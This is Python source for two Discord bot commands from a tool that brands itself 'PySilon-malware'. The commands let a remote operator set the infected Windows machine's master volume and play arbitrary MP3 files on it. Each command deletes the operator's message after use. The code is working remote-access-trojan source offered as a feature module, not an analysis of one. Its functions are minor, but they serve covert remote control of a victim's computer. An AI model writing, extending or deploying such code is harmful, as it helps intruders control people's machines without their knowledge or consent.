from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from pygame import mixer
from threading import Thread

@client.command(name='volume')
async def volume_control(ctx, volume_int=None):
    await ctx.message.delete()
    if volume_int != None:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))

        try: volume_int = int(volume_int)
        except:
            embed = discord.Embed(title="📛 Error",description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            return await ctx.send(embed=embed)

        if volume_int <= 100 and volume_int >= 0:
            volume.SetMasterVolumeLevelScalar(volume_int/100, None)
            embed = discord.Embed(title="🟢 Success",description=f'```Successfully set volume to {volume_int}%```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="📛 Error",description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="📛 Error",description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name='play')
async def play_audio(ctx, audio_file=None):
    await ctx.message.delete()
    if audio_file == None:
        embed = discord.Embed(title="📛 Error",description='```Syntax: .play <path/to/audio-file.mp3>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
    elif not ctx.message.content.endswith('.mp3'):
        embed = discord.Embed(title="📛 Error",description='```Invalid file type. Please select an MP3 file.```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
    else:
        def play_audio():
            audio_file = ctx.message.content[6:]
            audio_file = audio_file.replace('\\','/')
            mixer.init()
            mixer.music.load(audio_file)
            mixer.music.play()

            while mixer.music.get_busy():
                pass

            mixer.quit()

        Thread(target=play_audio).start()